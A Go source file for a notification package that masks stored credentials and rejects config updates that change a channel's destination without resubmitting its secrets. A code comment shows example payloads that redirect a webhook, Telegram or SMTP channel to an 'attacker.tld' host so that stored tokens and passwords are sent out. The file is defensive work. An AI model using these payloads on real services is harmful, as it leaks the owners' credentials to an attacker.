package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix marks a masked value. When the API echoes a credential it
// replaces the real contents with a value that starts with this prefix. An
// update that sends a value with the prefix means "keep the value stored in
// the database".
//
// A prefix is used instead of an empty string or a fixed constant so a
// little identifying hint can ride along (see MaskedValue). The user can
// tell which robot it is without pasting the secret again.
const MaskedPrefix = "__masked__"

// MaskedValue builds a masked value:
//
//	"__masked__"              the original is too short to hint at
//	"__masked__:…ab12cd"      the last 6 characters, as a recognition hint
//
// Showing only the last 6 characters is deliberate. The identifying part of
// a webhook URL is at the end (the WeCom key, the Feishu robot id), while
// the prefix is the same for every robot and identifies nothing. Six
// characters are not enough to recover the credential, but they are enough
// for the person who configured it to recognize "that is my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether v is a masked value, meaning the API echoed it
// and the caller did not change it.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of cfg with this channel's credential fields
// replaced by masked values.
//
// An unknown channel kind returns an empty map rather than the original
// config. Better for the UI to show "configuration unavailable" than to
// dump raw contents that may contain credentials when the kind cannot be
// recognized. Non-credential fields are kept as they are, so the UI can
// still display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested value such as headers is masked as one credential.
		// Deciding per sub-key would need every channel to declare a second
		// set of rules for which children are secrets, which costs more than
		// it saves.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means the destination changed and
// the caller did not state the credential fields. It is returned instead of
// silently allowing the change or silently dropping the credentials. See
// PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys that were not explicitly stated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") changed; also resubmit the credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide a new value, or leave the field explicitly empty if a credential is no longer required. " +
		"The stored credential is valid only for the old address; reusing it hands it to the new address."
}

// PrepareConfigUpdate merges a channel config and handles a destination
// change, which is security-sensitive.
//
// It replaces a bare MergeConfig on the channel-update path. The hole it
// closes was confirmed in practice: the destination (where the message goes)
// and the credentials (what identity sends it) are separate fields, and
// MergeConfig keeps the stored value for any key the update does not
// mention. Anyone who can PATCH a channel can change only the address and
// say nothing about the credentials, and the server will send the real
// stored secrets to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → after STARTTLS, the username and password are handed over
//
// The path is completely silent and does not depend on a redirect, so
// refusing cross-host hops does not stop it. It also defeats the point of
// masking in this package, which is that credentials are not echoed back to
// the browser.
//
// Rule: if any destination key changes to a new value, the caller must state
// every credential key explicitly:
//   - a new value replaces the stored one
//   - an explicit empty string means the field no longer needs a credential
//     (the clear semantics are kept)
//   - echoing the masked value back, or omitting the key, is rejected
//
// The third case is rejected because a masked value means "keep using the
// old credential", and the old credential is valid only for the old address.
// The credentials are not dropped automatically. For optional secret fields
// (webhook headers, the email password) that would silently become "auth is
// gone but the API returned 200", which is harder to diagnose than an error.
// Better to make the operator fill the field in again.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A non-string credential (webhook headers is an object) that contains
	// the mask literal means the caller stuffed the "keep the stored value"
	// sentinel inside the structure. MergeConfig only treats a string with
	// the prefix as a mask, so this shape would be stored as an ordinary
	// object. The database would then really contain the literal
	// "__masked__", and later auth would fail silently with no error. Reject
	// it instead.
	//
	// This check has to run first. When the address did not change the
	// function returns early, and putting the check later would cover only
	// the "address changed" path. The first version did exactly that, and a
	// test caught it.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that actually changed. A masked value means
	// "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address did not change. Ordinary merge: masked values keep the
		// stored value, an empty string clears, everything else overwrites.
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: every credential key must be stated explicitly.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers refuses a mask sentinel nested inside a
// non-string structure.
//
// Masking assumes the whole value is a string. An object field such as
// webhook headers can only be masked as a whole (the string "__masked__")
// or submitted as a whole. A sentinel inside the object does not mean "leave
// it unchanged", and it would be stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: submit the whole field (leave it empty to keep the stored value, or submit a new value); do not embed a mask placeholder inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue reports whether two config values are equivalent. JSON
// serialization is used so type differences are handled too: a port from the
// frontend is a JSON number, and the value read back from the database is
// float64, so a direct == comparison is wrong.
//
// "Empty" has to be normalized before the comparison. An empty string and a
// missing key are the same state in this config model, because MergeConfig
// treats an empty string as an explicit clear and deletes the key. Without
// that normalization, an optional destination that is always left blank
// (Telegram base_url is the only such field: blank means the official
// address) follows this path:
//
//	create stores base_url:""  →  the first save is deleted by MergeConfig
//	→ on the second save incoming is "" and stored has no key, which is
//	  judged as "the address changed"
//	→ the credential is a masked echo → 400 "destination changed; resubmit
//	  the credential fields"
//
// Every later save then fails unless the user pastes the bot token again,
// even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a config value is empty.
// The definition must match MergeConfig's clear check
// (strings.TrimSpace(s) == ""). Otherwise there is a gap where MergeConfig
// wants to delete the key and sameConfigValue thinks the value is present.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for a channel-config update.
//
// Rules:
//   - a key whose incoming value is masked → keep the stored value (the user
//     did not change that field)
//   - a key whose incoming value is an empty string → explicit clear; delete
//     the key
//   - every other key → overwrite with the incoming value
//   - a key present in stored but absent from incoming → keep it (partial
//     update)
//
// Whether an empty string means "clear" has to be explicit. A form submits
// an unfilled field as an empty string. Treating that as a real value would
// wipe a field the user left blank in order to keep the stored value.
// Explicit clear is the choice here, because there is no other way for the
// user to remove a field that was set wrong. Omitting the field can
// distinguish "not provided" from "provided empty", but the UI does not use
// that distinction.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged; keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
